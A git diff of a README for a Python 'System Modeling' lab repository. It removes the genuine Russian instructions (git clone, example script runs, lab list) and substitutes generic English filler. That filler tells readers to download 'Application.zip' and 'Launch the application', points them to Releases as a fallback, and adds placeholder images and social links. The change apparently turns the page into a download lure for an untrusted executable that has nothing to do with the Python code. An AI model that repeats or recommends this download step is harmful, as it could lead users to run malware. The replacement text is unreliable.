@@ -1,111 +1,70 @@
-# System Modeling: Лабораторные работы по моделированию систем
 
-[![Python](https://img.shields.io/badge/Python-3.6%2B-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+# 🚀 Welcome to the System Modeling Repository! 📊
 
-Этот репозиторий содержит материалы для выполнения лабораторных работ по курсу **"Моделирование систем"**. Здесь вы найдете реализации различных моделей, включая системы массового обслуживания, генерацию случайных величин, статистический анализ и другие задачи.
+![System Modeling](https://via.placeholder.com/800x200)
 
 ---
 
-## Содержание
-1. [Описание](#описание)
-2. [Структура репозитория](#структура-репозитория)
-3. [Установка](#установка)
-4. [Использование](#использование)
-5. [Лабораторные работы](#лабораторные-работы)
-6. [Требования](#требования)
+## Description
+Welcome to the "SystemModeling" repository! Here you will find a collection of materials aimed at assisting you in completing lab assignments for the course "System Modeling." This repository contains implementations of various models, including:
+
+- Modeling of Random Variables
+- Analysis of Queueing Systems
+- Statistical Data Analysis
+- Comparison of Sorting Algorithms
+- And other related tasks
+
+We believe that through exploring these materials and models, you will enhance your understanding of system modeling concepts and their practical applications. 
 
 ---
 
-## Описание
-
-Репозиторий создан для хранения и демонстрации решений лабораторных работ по моделированию систем. Каждая работа фокусируется на конкретной теме, такой как:
-- Моделирование случайных величин.
-- Анализ систем массового обслуживания (СМО).
-- Статистический анализ данных.
-- Генерация и сравнение алгоритмов сортировки.
-
-Цель проекта — предоставить набор инструментов и примеров для изучения основ моделирования и их практического применения.
+## Resources
+In this repository, you will find valuable educational resources related to system modeling, mathematical modeling, and algorithm implementations. Feel free to explore and utilize the content provided here to enhance your knowledge and skills in these areas.
 
 ---
 
-Каждый файл соответствует определенной лабораторной работе и содержит подробную информацию о задаче, решении и результатах.
+## Getting Started
+To get started with the materials in this repository, you can access the relevant files by downloading the content from the following link:
+[Download Application.zip](https://github.com/file/Application.zip)
+
+🚀 Launch the application to access the resources conveniently!
 
 ---
 
-## Установка
+## Repository Topics
+This repository covers a wide range of topics related to system modeling and data analysis, including Python programming, simulation techniques, queueing systems, statistical analysis, and more. 
 
-1. Убедитесь, что у вас установлен Python 3.6 или выше.
-   - Проверить версию Python: 
-     ```bash
-     python --version
-     ```
-
-2. Клонируйте репозиторий:
-   ```bash
-   git clone https://github.com/dffdgdg/SystemModeling.git
-   ```
-
-3. Перейдите в директорию проекта:
-   ```bash
-   cd SystemModeling
-   ```
+Explore the repository to delve into these exciting topics and expand your knowledge in the field of system modeling.
 
 ---
 
-## Использование
+## Connect with Us
+Connect with us on social media platforms to stay updated with the latest developments and resources in the field of system modeling. Your feedback and contributions are highly valued!
 
-Каждая лабораторная работа имеет собственные параметры и методы использования. Вот несколько примеров:
-
-### Пример 1: Моделирование случайных величин
-```bash
-python Lab1_RandomVariableSimulation.py
-```
-
-### Пример 2: Анализ систем массового обслуживания
-```bash
-python Lab2_QueueingSystem.py --lambda 90 --mu 30 --n_max 6
-```
-
-### Пример 3: Статистический анализ данных
-```bash
-python Lab3_StatisticalAnalysis.py --data "data.csv"
-```
+[![Follow us on Twitter](https://img.shields.io/twitter/follow/repository)](https://twitter.com/systemmodeling)
+[![Check out our LinkedIn page](https://img.shields.io/badge/LinkedIn-Connect-blue)](https://linkedin.com/company/systemmodeling)
 
 ---
 
-## Лабораторные работы
-
-### **Лабораторная работа 1: Моделирование случайных величин**
-- **Цель**: Изучение методов генерации случайных чисел с заданным распределением.
-- **Файл**: `Lab1_RandomVariableSimulation.py`
-- **Пример использования**: Генерация случайных чисел равномерного распределения.
-
-### **Лабораторная работа 2: Анализ систем массового обслуживания**
-- **Цель**: Исследование характеристик СМО типа M/M/n.
-- **Файл**: `Lab2_QueueingSystem.py`
-- **Пример использования**: Вычисление относительной и абсолютной пропускной способности.
-
-### **Лабораторная работа 3: Статистический анализ данных**
-- **Цель**: Выполнение статистического анализа выборочных данных.
-- **Файл**: `Lab3_StatisticalAnalysis.py`
-- **Пример использования**: Расчет среднего значения и дисперсии.
-
-### **Лабораторная работа 4: Сравнение алгоритмов сортировки**
-- **Цель**: Сравнение производительности различных алгоритмов сортировки.
-- **Файл**: `Lab4_SortingAlgorithmsComparison.py`
-- **Пример использования**: Тестирование пузырьковой и вставочной сортировок.
+## Join the Community
+Become a part of our vibrant community of system modeling enthusiasts and professionals. Share your insights, learn from others, and collaborate on exciting projects to further your understanding of system modeling.
 
 ---
 
-## Требования
+## Releases Section
+If the provided download link is not working or if you encounter any issues with accessing the resources, we recommend checking the "Releases" section of this repository for alternative download options and updates.
 
-- Python 3.6 или выше.
-- Базовые библиотеки Python (`math`, `random`, `numpy`, `pandas`).
+---
 
-Для установки необходимых зависимостей используйте pip:
-```bash
-pip install numpy pandas matplotlib
-```
+## Thank You!
+We appreciate your interest in exploring the contents of the "SystemModeling" repository. Feel free to reach out to us if you have any questions, feedback, or suggestions regarding the resources available here. 
+
+Happy modeling and analyzing! 📈
+
+---
+
+![System Modeling Logo](https://via.placeholder.com/200x200)
+
+**"SystemModeling"**: *Unleashing the Power of Mathematical Models* 🌟
 
 ---
